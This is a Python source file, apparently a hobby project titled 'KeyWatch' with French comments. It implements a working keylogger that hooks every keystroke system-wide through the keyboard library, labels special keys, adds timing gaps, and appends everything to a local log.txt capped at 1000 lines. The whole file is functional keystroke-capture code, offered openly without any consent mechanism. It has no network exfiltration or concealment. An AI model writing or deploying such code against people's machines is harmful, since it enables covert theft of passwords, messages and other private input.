# /$$   /$$                     /$$      /$$             /$$               /$$      
#| $$  /$$/                    | $$  /$ | $$            | $$              | $$      
#| $$ /$$/   /$$$$$$  /$$   /$$| $$ /$$$| $$  /$$$$$$  /$$$$$$    /$$$$$$$| $$$$$$$ 
#| $$$$$/   /$$__  $$| $$  | $$| $$/$$ $$ $$ |____  $$|_  $$_/   /$$_____/| $$__  $$
#| $$  $$  | $$$$$$$$| $$  | $$| $$$$_  $$$$  /$$$$$$$  | $$    | $$      | $$  \ $$
#| $$\  $$ | $$_____/| $$  | $$| $$$/ \  $$$ /$$__  $$  | $$ /$$| $$      | $$  | $$
#| $$ \  $$|  $$$$$$$|  $$$$$$$| $$/   \  $$|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$
#|__/  \__/ \_______/ \____  $$|__/     \__/ \_______/   \___/   \_______/|__/  |__/
#                     /$$  | $$                                                     
#                    |  $$$$$$/                                                     
#                     \______/      




import keyboard # Permet de capturer les touches frappés sur le clavier
import os
import datetime # Gère la date et l'heure pour heurodater dans le fichier log

# Assignation des touches spéciales pour les rendre plus lisibles 
# et ésthétiques.
KEY_MAP = {
    "space": " [SPACE] ",
    "enter": " [ENTER] ",
    "esc": " [ESC] ",
    "ctrl": " [CTRL] ",
    "alt": " [ALT] ",
    "alt gr":"[ALT GR]",
    "tab": " [TAB] ",
    "maj": " [MAJ] ",
    "backspace": " [BACKSPACE] ",
    "verr.maj": " [VERR. MAJ] ",
    "haut": " [HAUT] ",
    "bas": " [BAS] ",
    "gauche": " [GAUCHE] ",
    "droite": " [DROITE] ",
    "pg.suiv": " [PAGE UP] ",
    "pg.prec": " [PAGE DOWN] ",
    "home": " [HOME] ",
    "end": " [END] ",
    "insert": " [INSERT] ",
    "delete": " [DELETE] ",
    "f1": " [F1] ",
    "f2": " [F2] ",
    "f3": " [F3] ",
    "f4": " [F4] ",
    "f5": " [F5] ",
    "f6": " [F6] ",
    "f7": " [F7] ",
    "f8": " [F8] ",
    "f9": " [F9] ",
    "f10": " [F10] ",
    "f11": " [F11] ",
    "f12": " [F12] ",
}

# Définit le nombre de lignes à conserver dans le fichier "log.txt".
# Si le nombre de lignes dépasse cette valeur, la fonction "clean_file()" 
# est appelée pour supprimer les lignes les plus anciennes.
NUM_LINES_TO_KEEP = 1000

if not os.path.exists("log.txt"):
    with open("log.txt", "w"): # crée le fichier log.txt s'il n'existe pas
        pass

# Cette fonction prend en paramètres la liste des touches pressées sur le clavier ("keys_pressed") et l'heure de la dernière pression ("last_time").
def write_keys(keys_pressed, last_time):
    with open("log.txt", "a") as f:
        if " [ENTER] " in keys_pressed:
            f.write("[ENTER] \n")
        else:
            # Calcul de la différence de temps entre l'heure actuelle et l'heure de la dernière pression, cela créer un intervalle de temps.
            current_time = datetime.datetime.now()
            time_diff = (current_time - last_time).total_seconds()
            if time_diff >= 1:
                if time_diff < 2:
                    f.write(f"[{int(time_diff * 1000)} ms] {''.join(keys_pressed)}")
                else:
                    f.write(f"[{int(time_diff)} s] {''.join(keys_pressed)}")
            else:
                f.write(''.join(keys_pressed))
        
        # Vérifie si le nombre de lignes dans le fichier "log.txt" dépasse NUM_LINES_TO_KEEP et appelle la fonction clean_file() si nécessaire.
        with open("log.txt", "r") as f:
            num_lines = sum(1 for line in f)
        if num_lines > NUM_LINES_TO_KEEP:
            clean_file()
        
        return current_time


#  Cette fonction lit toutes les lignes du fichier "log.txt",
#  puis ouvre le fichier en mode "écriture" ("w") et écrit les
#  dernières lignes du fichier, jusqu'à "NUM_LINES_TO_KEEP".
def clean_file():
    with open("log.txt", "r") as f:
        lines = f.readlines()
    with open("log.txt", "w") as f:
        for line in lines[-NUM_LINES_TO_KEEP:]:
            f.write(line)

#  Cette fonction est appelée à chaque pression de touche.
#  Elle vérifie si la touche pressée est présente dans la carte 
#  de clavier ("KEY_MAP") ou si elle est imprimable. Si c'est le cas,
#  elle stocke la touche dans une liste "keys_pressed",
#  puis appelle la fonction "write_keys" pour écrire les touches 
#  dans le fichier de journal. Enfin, elle met à jour la variable
#  globale "last_time" avec l'heure de la pression de touche.
def on_press(event):
    try:
        keys_pressed = []
        if event.name in KEY_MAP:
            keys_pressed.append(KEY_MAP[event.name])
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        global last_time
        last_time = write_keys(keys_pressed, last_time)
    except Exception as e:
        print(f"Error: {e}")

#  Cette fonction est appelée à la sortie du programme.
#  Elle ouvre le fichier "log.txt" en mode ajout ("a") et
#  écrit la date et l'heure de l'arrêt du programme. 
#  Cela permet de savoir quand le programme a été arrêté et 
#  d'identifier les périodes manquantes dans le fichier de journal.
#  Cependant, si le programme est fermé de force, cette fonction ne
#  sera pas appelée et l'heure d'arrêt ne sera pas écrite dans le
#  fichier de journal.
def on_exit():
    # Écriture de la date et de l'heure de lancement du programme dans le fichier de journal.
    with open("log.txt", "a") as f:
        f.write(f"\n Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# write start time to file
with open("log.txt", "a") as f:
    f.write(f"\n Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")

# Initialisation de la variable "last_time" avec l'heure actuelle. 
# Cette variable est utilisée pour suivre le temps écoulé entre les pressions de touche.
last_time = datetime.datetime.now()

# Ces deux lignes permettent d'écouter les événements de pression de
# touche en continu. Lorsqu'une touche est pressée, la fonction
# "on_press" est appelée pour traiter la touche.
keyboard.on_press(on_press)
keyboard.wait()

# Cette fonction est appelée à la sortie du programme. Elle ouvre le fichier "log.txt" en mode "ajout" ("a") et écrit la date et l'heure de l'arrêt du programme. Si le programme est fermé de force, cela ne fonctionne pas.
on_exit()
